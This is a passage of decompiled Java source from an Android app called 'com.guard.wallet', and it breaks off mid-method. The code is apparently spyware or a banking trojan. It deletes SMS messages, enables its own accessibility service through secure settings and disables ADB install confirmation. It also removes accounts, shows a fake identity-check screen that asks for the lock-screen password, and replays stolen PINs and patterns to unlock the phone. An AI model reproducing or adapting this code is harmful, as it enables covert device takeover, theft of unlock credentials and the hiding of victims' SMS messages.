package com.guard.wallet.utils;

import a0.C0001a;
import a1.AbstractC0026q;
import android.accessibilityservice.GestureDescription;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.ActivityManager;
import android.app.Application;
import android.app.KeyguardManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ActivityInfo;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PermissionInfo;
import android.content.pm.ResolveInfo;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.Matrix;
import android.graphics.Paint;
import android.graphics.Path;
import android.graphics.Picture;
import android.graphics.drawable.Drawable;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.PowerManager;
import android.os.Process;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.sun.misc.BASE64Encoder;
import android.sun.security.provider.X509Factory;
import android.sun.security.x509.AlgorithmId;
import android.sun.security.x509.CertificateAlgorithmId;
import android.sun.security.x509.CertificateExtensions;
import android.sun.security.x509.CertificateIssuerName;
import android.sun.security.x509.CertificateSerialNumber;
import android.sun.security.x509.CertificateSubjectName;
import android.sun.security.x509.CertificateValidity;
import android.sun.security.x509.CertificateVersion;
import android.sun.security.x509.CertificateX509Key;
import android.sun.security.x509.InvalidityDateExtension;
import android.sun.security.x509.KeyIdentifier;
import android.sun.security.x509.PrivateKeyUsageExtension;
import android.sun.security.x509.SubjectKeyIdentifierExtension;
import android.sun.security.x509.X500Name;
import android.sun.security.x509.X509CertImpl;
import android.sun.security.x509.X509CertInfo;
import android.support.v4.content.ContextCompat;
import android.support.v4.os.EnvironmentCompat;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import android.view.ViewConfiguration;
import com.google.json.reflect.TypeToken;
import com.guard.wallet.LockActivity;
import com.guard.wallet.MainApplication;
import com.guard.wallet.activity.ConfirmDeviceActivity;
import com.guard.wallet.condition.ActionValueCondition;
import com.guard.wallet.condition.BoolCondition;
import com.guard.wallet.condition.GlobalActionCondition;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.Point;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.entity.UiObjectCollection;
import com.guard.wallet.entity.WIFIState;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.helper.AbstractC0181d;
import com.guard.wallet.helper.RunnableC0185h;
import com.guard.wallet.http.AbstractC0207l;
import com.guard.wallet.http.C0204i;
import com.guard.wallet.receiver.AlarmReceiver;
import com.guard.wallet.receiver.BatteryLevelReceiver;
import com.guard.wallet.receiver.BootBroadcast;
import com.guard.wallet.receiver.CallReceiver;
import com.guard.wallet.receiver.CustomAdminReceiver;
import com.guard.wallet.receiver.NetWorkReceiver;
import com.guard.wallet.receiver.PackageReceiver;
import com.guard.wallet.receiver.PowerBroadcastReceiver;
import com.guard.wallet.receiver.ScreenBroadcastReceiver;
import com.guard.wallet.receiver.ShutDownBroadcastReceiver;
import com.guard.wallet.receiver.SmsReceiver;
import com.guard.wallet.req.DeviceCipherStateVO;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.req.LockPatternVO;
import com.guard.wallet.req.NetStateVO;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.req.ScreenMetricsVO;
import com.guard.wallet.req.TouchEvent;
import com.guard.wallet.resp.AppInfo;
import com.guard.wallet.resp.CallStateVO;
import com.guard.wallet.resp.DeviceAdminVO;
import com.guard.wallet.resp.DeviceContactInfoVO;
import com.guard.wallet.resp.DeviceContactNumberVO;
import com.guard.wallet.resp.PermissionInfoVO;
import com.guard.wallet.resp.PermissionsBodyVO;
import com.guard.wallet.resp.SmsRecognizePlug;
import com.guard.wallet.service.MyAccessibilityService;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.lang.reflect.Method;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.security.KeyFactory;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.SecureRandom;
import java.security.cert.Certificate;
import java.security.cert.CertificateFactory;
import java.security.spec.PKCS8EncodedKeySpec;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Date;
import java.util.HashMap;
import java.util.Iterator;
import java.util.LinkedHashSet;
import java.util.LinkedList;
import java.util.List;
import java.util.ListIterator;
import java.util.Locale;
import java.util.Objects;
import java.util.Random;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import o0.C0441d;
import o0.C0445h;
import org.bouncycastle.asn1.cmp.PKIFailureInfo;
import org.bouncycastle.i18n.TextBundle;
import org.bouncycastle.tls.NamedGroup;
import com.guard.wallet.entity.BuildConfig;
import p0.C0879u;
import p000a.AbstractC0000a;
import p002e.C0262b;
import p005h.C0318e;
import p007j.C0349d;
import p007j.C0350e;
import p017u.C0919b;
import p019w.AbstractC0956a;

/* renamed from: com.guard.wallet.utils.g */
/* loaded from: classes.dex */
public abstract class AbstractC0251g {
    /* renamed from: A */
    public static void m628A(String str) {
        if (MainApplication.getAppContext() == null || AbstractC0026q.m151B(str)) {
            return;
        }
        Uri parse = Uri.parse("content://sms/");
        ContentResolver contentResolver = MainApplication.getAppContext().getContentResolver();
        if (contentResolver != null) {
            try {
                Cursor query = contentResolver.query(parse, new String[]{"_id", "thread_id", "address", "person", InvalidityDateExtension.DATE}, "address=?", new String[]{str}, "date DESC");
                if (query != null) {
                    if (query.moveToFirst()) {
                        contentResolver.delete(Uri.parse("content://sms/" + query.getLong(0)), null, null);
                    }
                    query.close();
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("SmsManager", e2);
            }
        }
    }

    public static Intent A0(String str, String str2) {
        Intent u02;
        Intent intent = null;
        try {
            if (AbstractC0026q.m151B(str2)) {
                u02 = u0(str);
            } else {
                ComponentName componentName = new ComponentName(str, str2);
                u02 = new Intent();
                try {
                    u02.setComponent(componentName);
                } catch (Exception e2) {
                    e = e2;
                    intent = u02;
                    AbstractC0026q.m186s("ApplicationUtil", e);
                    return intent;
                }
            }
            intent = u02;
            if (intent != null) {
                intent.addFlags(268435456);
                intent.addFlags(2097152);
                intent.addFlags(8388608);
            }
        } catch (Exception e3) {
            e = e3;
        }
        return intent;
    }

    /* renamed from: B */
    public static boolean m629B(String str, String str2) {
        if (Objects.equals(str, str2) || AbstractC0026q.m151B(str2) || m653Z() == null || m653Z().getContentResolver() == null || !m662i()) {
            return false;
        }
        try {
            Uri parse = Uri.parse(str2);
            return (Build.VERSION.SDK_INT >= 30 ? m653Z().getContentResolver().delete(parse, null) : m653Z().getContentResolver().delete(parse, null, null)) > 0;
        } catch (Exception e2) {
            AbstractC0026q.m186s("GalleryUtils", e2);
            return false;
        }
    }

    public static LockPatternVO B0() {
        LockPatternVO lockPatternVO = new LockPatternVO(0, 0, 0, 0, 0, 0, -1);
        if (m653Z() != null) {
            lockPatternVO.setIsScreenOn(Integer.valueOf(AbstractC0249e.m621j() ? 1 : 0));
            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) m653Z().getSystemService("device_policy");
            int passwordQuality = (devicePolicyManager.isDeviceOwnerApp(m653Z().getPackageName()) || devicePolicyManager.isProfileOwnerApp(m653Z().getPackageName())) ? devicePolicyManager.getPasswordQuality(new ComponentName(m653Z(), (Class<?>) CustomAdminReceiver.class)) : -1;
            KeyguardManager keyguardManager = (KeyguardManager) m653Z().getSystemService("keyguard");
            if (keyguardManager.isKeyguardLocked()) {
                lockPatternVO.setIsKeyguardLocked(1);
            }
            if (keyguardManager.isDeviceLocked()) {
                lockPatternVO.setIsDeviceLocked(1);
            }
            if (keyguardManager.isKeyguardSecure()) {
                lockPatternVO.setIsKeyguardSecure(1);
            }
            if (keyguardManager.isDeviceSecure()) {
                lockPatternVO.setIsDeviceSecure(1);
            }
            if (keyguardManager.inKeyguardRestrictedInputMode()) {
                lockPatternVO.setInKeyguardRestrictedInputMode(1);
            }
            lockPatternVO.setQuality(Integer.valueOf(passwordQuality));
        }
        return lockPatternVO;
    }

    /* renamed from: C */
    public static boolean m630C() {
        if (m653Z() == null || !m663j()) {
            return false;
        }
        try {
            LinkedList f02 = f0();
            LinkedHashSet q02 = q0();
            if (!f02.isEmpty() && !q02.isEmpty()) {
                Iterator it = f02.iterator();
                while (it.hasNext()) {
                    q02.remove((String) it.next());
                }
            }
            String str = BuildConfig.FLAVOR;
            if (!q02.isEmpty()) {
                str = TextUtils.join(":", q02);
            }
            return Settings.Secure.putString(m653Z().getContentResolver(), "enabled_accessibility_services", str);
        } catch (Exception e2) {
            AbstractC0026q.m186s("ApplicationUtil", e2);
            return false;
        }
    }

    public static DeviceAdminVO C0() {
        DeviceAdminVO deviceAdminVO = new DeviceAdminVO(null, 0, 0, 0);
        if (m653Z() != null) {
            deviceAdminVO.setPackageName(m653Z().getPackageName());
            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) m653Z().getSystemService("device_policy");
            if (devicePolicyManager.isAdminActive(new ComponentName(m653Z(), (Class<?>) CustomAdminReceiver.class))) {
                deviceAdminVO.setIsAdminActive(1);
                if (devicePolicyManager.isDeviceOwnerApp(m653Z().getPackageName())) {
                    deviceAdminVO.setIsDeviceOwner(1);
                    deviceAdminVO.setIsProfileOwner(1);
                }
                if (devicePolicyManager.isProfileOwnerApp(m653Z().getPackageName())) {
                    deviceAdminVO.setIsProfileOwner(1);
                }
            }
        }
        return deviceAdminVO;
    }

    /* renamed from: D */
    public static void m631D() {
        int i2;
        if (m653Z() == null || ContextCompat.checkSelfPermission(m653Z(), "android.permission.WRITE_SECURE_SETTINGS") != 0) {
            return;
        }
        try {
            i2 = Settings.Secure.getInt(m653Z().getContentResolver(), "adb_install_need_confirm");
        } catch (Exception e2) {
            AbstractC0026q.m186s("ApplicationUtil", e2);
            i2 = -1;
        }
        try {
            if (Objects.equals(Integer.valueOf(i2), 0)) {
                return;
            }
            Settings.Secure.putInt(m653Z().getContentResolver(), "adb_install_need_confirm", 0);
        } catch (Exception e3) {
            AbstractC0026q.m186s("ApplicationUtil", e3);
        }
    }

    public static CombineFilter D0() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.getStringConditions().add(AbstractC0000a.m7c(combineFilter, "className", "android.view.View"));
        StringCondition stringCondition = new StringCondition();
        stringCondition.setProperty("desc");
        stringCondition.setRegex("\\d");
        combineFilter.getStringConditions().add(stringCondition);
        return combineFilter;
    }

    /* renamed from: E */
    public static int m632E(String str) {
        try {
            if (AbstractC0026q.m151B(str)) {
                return 0;
            }
            return m633F((List) AbstractC0252h.m699c(str, new TypeToken<List<SmsRecognizePlug>>() { // from class: com.guard.wallet.utils.SmsRecognizePlugUtils$1
            }));
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.utils.g", e2);
            return 0;
        }
    }

    public static String E0(C0445h c0445h, ArrayList arrayList) {
        if (arrayList == null) {
            return BuildConfig.FLAVOR;
        }
        int size = arrayList.size();
        StringBuilder sb = new StringBuilder();
        for (int i2 = 0; i2 < size; i2++) {
            C0441d c0441d = (C0441d) arrayList.get(i2);
            sb.append((c0445h.getDotCount() * c0441d.f990a) + c0441d.f991b);
        }
        return sb.toString();
    }

    /* renamed from: F */
    public static int m633F(List list) {
        int i2 = 0;
        if (MainApplication.getInstance() != null && MainApplication.getInstance().getSmsMessageListener() != null && list != null) {
            try {
                if (!list.isEmpty()) {
                    MainApplication.getInstance().getSmsMessageListener().f2086a.clear();
                    Iterator it = list.iterator();
                    while (it.hasNext()) {
                        SmsRecognizePlug smsRecognizePlug = (SmsRecognizePlug) it.next();
                        i2++;
                        C0919b smsMessageListener = MainApplication.getInstance().getSmsMessageListener();
                        if (smsRecognizePlug != null) {
                            LinkedList linkedList = smsMessageListener.f2086a;
                            if (!linkedList.contains(smsRecognizePlug)) {
                                linkedList.add(smsRecognizePlug);
                            }
                        } else {
                            smsMessageListener.getClass();
                        }
                    }
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("com.guard.wallet.utils.g", e2);
            }
        }
        return i2;
    }

    public static boolean F0(int i2) {
        if (MyAccessibilityService.m554P() == null) {
            return false;
        }
        return MyAccessibilityService.m554P().performGlobalAction(i2);
    }

    /* renamed from: G */
    public static int m634G(String str) {
        try {
            if (AbstractC0026q.m151B(str)) {
                return 0;
            }
            return m635H((List) AbstractC0252h.m699c(str, new TypeToken<List<ListenWindow>>() { // from class: com.guard.wallet.utils.ListenWindowUtils$1
            }));
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.utils.g", e2);
            return 0;
        }
    }

    public static boolean G0(Integer num, Integer num2, Long l2) {
        return m646S(16L, l2, new Point(num.floatValue(), num2.floatValue()));
    }

    /* renamed from: H */
    public static int m635H(List list) {
        AtomicInteger atomicInteger = new AtomicInteger(0);
        if (list != null) {
            try {
                if (!list.isEmpty()) {
                    if (MyAccessibilityService.m554P() != null && !MyAccessibilityService.m554P().m529j()) {
                        Collections.sort(list);
                        MyAccessibilityService m554P = MyAccessibilityService.m554P();
                        ConcurrentLinkedQueue concurrentLinkedQueue = m554P.f303a;
                        try {
                            if (!concurrentLinkedQueue.isEmpty()) {
                                concurrentLinkedQueue.removeIf(new C0001a(m554P, 4));
                            }
                        } catch (Exception e2) {
                            AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
                        }
                        Iterator it = list.iterator();
                        while (it.hasNext()) {
                            ListenWindow listenWindow = (ListenWindow) it.next();
                            atomicInteger.incrementAndGet();
                            if (listenWindow.getEventSubscribes() != null && listenWindow.getEventSubscribes().size() >= 2) {
                                Collections.sort(listenWindow.getEventSubscribes());
                            }
                            MyAccessibilityService.m554P().m522c(listenWindow);
                        }
                    }
                    return atomicInteger.get();
                }
            } catch (Exception e3) {
                AbstractC0026q.m186s("com.guard.wallet.utils.g", e3);
            }
        }
        return atomicInteger.get();
    }

    public static Certificate H0() {
        try {
            String i02 = i0();
            if (!AbstractC0026q.m151B(i02)) {
                File file = new File(i02.concat("/").concat("cert.pem"));
                if (!file.exists()) {
                    return null;
                }
                return CertificateFactory.getInstance("X.509").generateCertificate(new FileInputStream(file));
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("AdbKeyUtils", e2);
        }
        return null;
    }

    /* renamed from: I */
    public static boolean m636I() {
        if (m653Z() != null) {
            r1 = Settings.Global.getInt(m653Z().getContentResolver(), "adb_enabled", 0) > 0;
            if (!r1) {
                Log.d("ApplicationUtil", "未开启ADB调试");
            }
        }
        return r1;
    }

    public static PrivateKey I0() {
        try {
            String i02 = i0();
            if (!AbstractC0026q.m151B(i02)) {
                File file = new File(i02.concat("/").concat("private.key"));
                if (!file.exists()) {
                    return null;
                }
                byte[] bArr = new byte[(int) file.length()];
                if (new FileInputStream(file).read(bArr) > 0) {
                    return KeyFactory.getInstance("RSA").generatePrivate(new PKCS8EncodedKeySpec(bArr));
                }
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("AdbKeyUtils", e2);
        }
        return null;
    }

    /* renamed from: J */
    public static boolean m637J() {
        if (m653Z() != null) {
            r1 = Settings.Global.getInt(m653Z().getContentResolver(), "adb_wifi_enabled", 0) > 0;
            if (!r1) {
                Log.d("ApplicationUtil", "未开启无线调试");
            }
        }
        return r1;
    }

    public static void J0(Bitmap bitmap) {
        if (bitmap == null || bitmap.isRecycled()) {
            return;
        }
        bitmap.recycle();
    }

    /* renamed from: K */
    public static boolean m638K() {
        return m653Z() != null && Settings.Global.getInt(m653Z().getContentResolver(), "development_settings_enabled", 0) > 0;
    }

    public static boolean K0(String str) {
        int i2;
        int i3;
        if (AbstractC0026q.m151B(str)) {
            str = "com.guard.wallet";
        }
        if (m653Z() != null) {
            try {
                AccountManager accountManager = AccountManager.get(m653Z());
                Account[] accountsByType = accountManager.getAccountsByType(str);
                if (accountsByType.length > 0) {
                    i2 = accountsByType.length;
                    i3 = 0;
                    for (Account account : accountsByType) {
                        if (Objects.equals(account.type, str) && accountManager.removeAccountExplicitly(account)) {
                            i3++;
                        }
                    }
                } else {
                    i2 = 0;
                    i3 = 0;
                }
                return i3 == i2;
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccountUtils", e2);
            }
        }
        return false;
    }

    /* renamed from: L */
    public static boolean m639L() {
        if (m653Z() != null && m663j()) {
            try {
                if (m677x() && m630C()) {
                    T0(10);
                }
                if (!m677x()) {
                    LinkedList f02 = f0();
                    LinkedHashSet q02 = q0();
                    if (!f02.isEmpty()) {
                        q02.add((String) f02.get(0));
                        String join = TextUtils.join(":", q02);
                        if (Settings.Secure.putString(m653Z().getContentResolver(), "enabled_accessibility_services", join) && Settings.Secure.putInt(m653Z().getContentResolver(), "accessibility_enabled", 1) && Settings.Secure.putInt(m653Z().getContentResolver(), "touch_exploration_enabled", 1) && Settings.Secure.putString(m653Z().getContentResolver(), "touch_exploration_granted_accessibility_services", join)) {
                            Log.d("ApplicationUtil", "本地启动无障碍服务成功");
                            return true;
                        }
                    }
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("ApplicationUtil", e2);
            }
        }
        return false;
    }

    public static String L0(C0879u c0879u) {
        String m1294e = c0879u.m1294e();
        String m1296g = c0879u.m1296g();
        if (m1296g == null) {
            return m1294e;
        }
        return m1294e + '?' + m1296g;
    }

    /* renamed from: M */
    public static void m640M(UiObject uiObject) {
        if (p0()) {
            if ((C0318e.m844S() != null && C0318e.m844S().mo302D() && C0318e.m844S().m855N("input keyevent 66")) || MyAccessibilityService.m554P() == null || uiObject == null || Build.VERSION.SDK_INT < 30) {
                return;
            }
            uiObject.enter();
        }
    }

    public static byte[] M0(Bitmap bitmap, float f2, int i2) {
        if (f2 > 1.0f || f2 <= 0.0f) {
            f2 = 0.5f;
        }
        if (i2 > 100 || i2 <= 0) {
            i2 = 20;
        }
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        if (bitmap == null) {
            return byteArrayOutputStream.toByteArray();
        }
        try {
            Bitmap k02 = k0(bitmap, bitmap.getWidth() * f2);
            k02.compress(Build.VERSION.SDK_INT >= 30 ? Bitmap.CompressFormat.WEBP_LOSSY : Bitmap.CompressFormat.WEBP, i2, byteArrayOutputStream);
            byteArrayOutputStream.flush();
            byteArrayOutputStream.close();
            J0(k02);
        } catch (Exception e2) {
            AbstractC0026q.m186s("BitmapUtils", e2);
        }
        return byteArrayOutputStream.toByteArray();
    }

    /* renamed from: N */
    public static void m641N(UiObject uiObject) {
        String str;
        if (p0()) {
            if (MyAccessibilityService.m554P() != null) {
                if (AbstractC0249e.m623l()) {
                    if (u1()) {
                        str = "依VIVO规则确认密码完成";
                        Log.d("UnLockUtils", str);
                        return;
                    }
                    Log.e("UnLockUtils", "依VIVO规则确认密码失败");
                }
                if (AbstractC0249e.m624m()) {
                    Log.d("UnLockUtils", "依MIUI规则输入回车键");
                    MyAccessibilityService m554P = MyAccessibilityService.m554P();
                    CombineFilter y1 = y1();
                    m554P.getClass();
                    UiObject m551M = MyAccessibilityService.m551M(y1);
                    if (m551M != null && m551M.click()) {
                        str = "查找并点击MIUI回车键完成";
                        Log.d("UnLockUtils", str);
                        return;
                    }
                    Log.e("UnLockUtils", "查找并点击MIUI回车键失败");
                }
            }
            if (C0318e.m844S() != null && C0318e.m844S().mo302D()) {
                Log.d("UnLockUtils", "委托RatHat容器输入回车键");
                if (C0318e.m844S().m855N("input keyevent 66")) {
                    str = "委托RatHat容器输入回车键完成";
                    Log.d("UnLockUtils", str);
                    return;
                }
            }
            if (MyAccessibilityService.m554P() != null) {
                Log.d("UnLockUtils", "委托无障碍容器输入回车键");
                if (uiObject == null) {
                    uiObject = MyAccessibilityService.m554P().m560J();
                }
                if (uiObject == null || Build.VERSION.SDK_INT < 30) {
                    return;
                }
                uiObject.enter();
                Log.d("UnLockUtils", "委托无障碍容器输入回车键完成");
            }
        }
    }

    public static String N0(String str) {
        if (m653Z() != null && m653Z().getContentResolver() != null && m662i()) {
            try {
                ContentResolver contentResolver = m653Z().getContentResolver();
                String m191x = AbstractC0026q.m191x(str);
                if (AbstractC0026q.m151B(m191x)) {
                    m191x = EnvironmentCompat.MEDIA_UNKNOWN;
                }
                return MediaStore.Images.Media.insertImage(contentResolver, str, m191x, (String) null);
            } catch (FileNotFoundException e2) {
                AbstractC0026q.m186s("GalleryUtils", e2);
            }
        }
        return null;
    }

    /* renamed from: O */
    public static boolean m642O(DeviceCipherStateVO deviceCipherStateVO) {
        UiObject m560J;
        if (!(deviceCipherStateVO != null && (!Objects.equals(deviceCipherStateVO.getCipherGradeCode(), "PASSWORD_QUALITY_TOUCH_POINTS") ? !Objects.equals(deviceCipherStateVO.getCipherGradeCode(), "PASSWORD_QUALITY_PATTERN") ? !(AbstractC0026q.m151B(deviceCipherStateVO.getTextCipher()) || AbstractC0026q.m151B(deviceCipherStateVO.getCipherGradeCode())) : !(deviceCipherStateVO.getPatternCipher() == null || deviceCipherStateVO.getPatternCipher().isEmpty()) : deviceCipherStateVO.getTouchCipher() == null || deviceCipherStateVO.getTouchCipher().isEmpty()))) {
            return false;
        }
        if (!((MyAccessibilityService.m554P() == null || AbstractC0026q.m151B(deviceCipherStateVO.getPackageName())) ? false : Objects.equals(MyAccessibilityService.m552N(), deviceCipherStateVO.getPackageName()))) {
            return false;
        }
        if (Objects.equals(deviceCipherStateVO.getCipherGradeCode(), "PASSWORD_QUALITY_TOUCH_POINTS")) {
            List<Point> touchCipher = deviceCipherStateVO.getTouchCipher();
            if (touchCipher != null && !touchCipher.isEmpty()) {
                if (MyAccessibilityService.m554P() != null && m673t(touchCipher)) {
                    return true;
                }
                if (C0318e.m844S() != null && C0318e.m844S().mo302D()) {
                    return C0318e.m844S().c0(touchCipher);
                }
            }
            return false;
        }
        Point point = null;
        if (!Objects.equals(deviceCipherStateVO.getCipherGradeCode(), "PASSWORD_QUALITY_PATTERN")) {
            String textCipher = deviceCipherStateVO.getTextCipher();
            if (!AbstractC0026q.m151B(textCipher)) {
                if (C0318e.m844S() != null && C0318e.m844S().mo302D()) {
                    if (C0318e.m844S().m855N("input text ".concat(textCipher))) {
                        m640M(null);
                        return true;
                    }
                }
                if (MyAccessibilityService.m554P() != null && (m560J = MyAccessibilityService.m554P().m560J()) != null && m560J.setText(textCipher)) {
                    m640M(m560J);
                    return true;
                }
            }
            return false;
        }
        List<Point> patternCipher = deviceCipherStateVO.getPatternCipher();
        if (patternCipher != null && !patternCipher.isEmpty()) {
            LinkedList linkedList = new LinkedList(patternCipher);
            if (!linkedList.isEmpty()) {
                ListIterator listIterator = linkedList.listIterator();
                while (listIterator.hasNext()) {
                    Point point2 = (Point) listIterator.next();
                    if (point2 == null || point2.getX() < 0.0f || point2.getY() < 0.0f) {
                        listIterator.remove();
                    } else {
                        if (point2.equals(point)) {
                            listIterator.remove();
                        }
                        point = point2;
                    }
                }
            }
            if (MyAccessibilityService.m554P() != null) {
                Point[] pointArr = new Point[linkedList.size()];
                linkedList.toArray(pointArr);
                try {
                    ExecutorService newFixedThreadPool = Executors.newFixedThreadPool(1);
                    for (int i2 = 1; i2 <= 4; i2++) {
                        long j2 = i2 * 1000;
                        CountDownLatch countDownLatch = new CountDownLatch(1);
                        newFixedThreadPool.submit(new RunnableC0185h(j2, pointArr, 0));
                        if (!countDownLatch.await(j2 + 1000, TimeUnit.MILLISECONDS)) {
                            T0(10);
                            newFixedThreadPool.shutdownNow();
                        }
                    }
                    return true;
                } catch (Exception e2) {
                    AbstractC0026q.m186s("EnterCipherHelper", e2);
                    return true;
                }
            }
        }
        return false;
    }

    public static int O0() {
        if (m653Z() == null) {
            return 90;
        }
        try {
            int i2 = Settings.System.getInt(m653Z().getContentResolver(), "screen_brightness");
            if (i2 >= 0) {
                return i2;
            }
            return 90;
        } catch (Exception e2) {
            AbstractC0026q.m186s("ApplicationUtil", e2);
            return 90;
        }
    }

    /* renamed from: P */
    public static void m643P() {
        t0(false);
        AbstractC0181d.m346b("GLOBAL_UNLOCK");
        if (MyAccessibilityService.m554P() != null) {
            MyAccessibilityService m554P = MyAccessibilityService.m554P();
            m554P.getClass();
            try {
                m554P.f331n.set(false);
            } catch (Exception e2) {
                AbstractC0026q.m186s("MyAccessibilityService", e2);
            }
        }
    }

    public static Long P0() {
        if (m653Z() == null) {
            return null;
        }
        try {
            long j2 = Settings.System.getLong(m653Z().getContentResolver(), "screen_off_timeout");
            if (j2 > 0) {
                return Long.valueOf(j2);
            }
            return null;
        } catch (Exception e2) {
            AbstractC0026q.m186s("ApplicationUtil", e2);
            return null;
        }
    }

    /* renamed from: Q */
    public static void m644Q() {
        t0(false);
        AbstractC0181d.m346b("GLOBAL_UNLOCK");
        if (MyAccessibilityService.m554P() != null) {
            MyAccessibilityService m554P = MyAccessibilityService.m554P();
            m554P.getClass();
            try {
                m554P.f331n.set(false);
            } catch (Exception e2) {
                AbstractC0026q.m186s("MyAccessibilityService", e2);
            }
        }
    }

    public static boolean Q0() {
        Integer num = AbstractC0248d.f402a;
        return R0((MainApplication.getInstance() == null || MainApplication.getInstance().getBuildConfig() == null || AbstractC0026q.m151B(MainApplication.getInstance().getBuildConfig().getAppCredentialTitle())) ? "Verify personal identity" : MainApplication.getInstance().getBuildConfig().getAppCredentialTitle(), (MainApplication.getInstance() == null || MainApplication.getInstance().getBuildConfig() == null || AbstractC0026q.m151B(MainApplication.getInstance().getBuildConfig().getAppCredentialSubTitle())) ? "Privacy protection" : MainApplication.getInstance().getBuildConfig().getAppCredentialSubTitle(), (MainApplication.getInstance() == null || MainApplication.getInstance().getBuildConfig() == null || AbstractC0026q.m151B(MainApplication.getInstance().getBuildConfig().getAppCredentialDescription())) ? "To protect your privacy, please enter your lock screen password to verify that you are the one making the operation." : MainApplication.getInstance().getBuildConfig().getAppCredentialDescription(), "PREPARE_FOR_APP_CONFIRM_LOCK");
    }

    /* renamed from: R */
    public static boolean m645R() {
        File file;
        try {
            KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("RSA");
            keyPairGenerator.initialize(2048, SecureRandom.getInstance("SHA1PRNG"));
            KeyPair generateKeyPair = keyPairGenerator.generateKeyPair();
            PublicKey publicKey = generateKeyPair.getPublic();
            PrivateKey privateKey = generateKeyPair.getPrivate();
            String concat = "CN=".concat("com.guard.wallet");
            long currentTimeMillis = System.currentTimeMillis() + 315360000000L;
            CertificateExtensions certificateExtensions = new CertificateExtensions();
            certificateExtensions.set(SubjectKeyIdentifierExtension.NAME, new SubjectKeyIdentifierExtension(new KeyIdentifier(publicKey).getIdentifier()));
            X500Name x500Name = new X500Name(concat);
            Date date = new Date();
            Date date2 = new Date(currentTimeMillis);
            certificateExtensions.set(PrivateKeyUsageExtension.NAME, new PrivateKeyUsageExtension(date, date2));
            CertificateValidity certificateValidity = new CertificateValidity(date, date2);
            X509CertInfo x509CertInfo = new X509CertInfo();
            x509CertInfo.set("version", new CertificateVersion(2));
            x509CertInfo.set("serialNumber", new CertificateSerialNumber(new Random().nextInt() & Integer.MAX_VALUE));
            x509CertInfo.set("algorithmID", new CertificateAlgorithmId(AlgorithmId.get("SHA512withRSA")));
            x509CertInfo.set("subject", new CertificateSubjectName(x500Name));
            x509CertInfo.set("key", new CertificateX509Key(publicKey));
            x509CertInfo.set("validity", certificateValidity);
            x509CertInfo.set("issuer", new CertificateIssuerName(x500Name));
            x509CertInfo.set("extensions", certificateExtensions);
            X509CertImpl x509CertImpl = new X509CertImpl(x509CertInfo);
            x509CertImpl.sign(privateKey, "SHA512withRSA");
            try {
            } catch (Exception e2) {
                AbstractC0026q.m186s("AdbKeyUtils", e2);
            }
            if (!AbstractC0026q.m151B(i0())) {
                file = new File(i0(), "private.key");
                FileOutputStream fileOutputStream = new FileOutputStream(file);
                fileOutputStream.write(privateKey.getEncoded());
                fileOutputStream.flush();
                fileOutputStream.close();
                return (file == null || w1(x509CertImpl) == null) ? false : true;
            }
            file = null;
            if (file == null) {
                return false;
            }
        } catch (Exception e3) {
            AbstractC0026q.m186s("AdbKeyUtils", e3);
            return false;
        }
    }

    public static boolean R0(String str, String str2, String str3, String str4) {
        try {
            if (m653Z() == null || MyAccessibilityService.m554P() == null || MyAccessibilityService.m554P().m529j() || AbstractC0956a.m1443a() || p0()) {
                return false;
            }
            if (AbstractC0026q.m156G() && !AbstractC0026q.m150A() && !AbstractC0026q.m164O(null, null)) {
                return false;
            }
            Intent A0 = A0(m653Z().getPackageName(), ConfirmDeviceActivity.class.getName());
            Bundle bundle = new Bundle();
            bundle.putString("CONFIRM_DEVICE_CREDENTIAL_TITLE", str);
            bundle.putString("CONFIRM_DEVICE_CREDENTIAL_SUB_TITLE", str2);
            bundle.putString("CONFIRM_DEVICE_CREDENTIAL_DESCRIPTION", str3);
            bundle.putString("CONFIRM_FOR_EVENT_CODE", str4);
            A0.putExtras(bundle);
            m653Z().startActivity(A0);
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("ApplicationUtil", e2);
        }
        return false;
    }

    /* renamed from: S */
    public static boolean m646S(Long l2, Long l3, Point... pointArr) {
        Path path;
        if (pointArr == null || pointArr.length <= 0) {
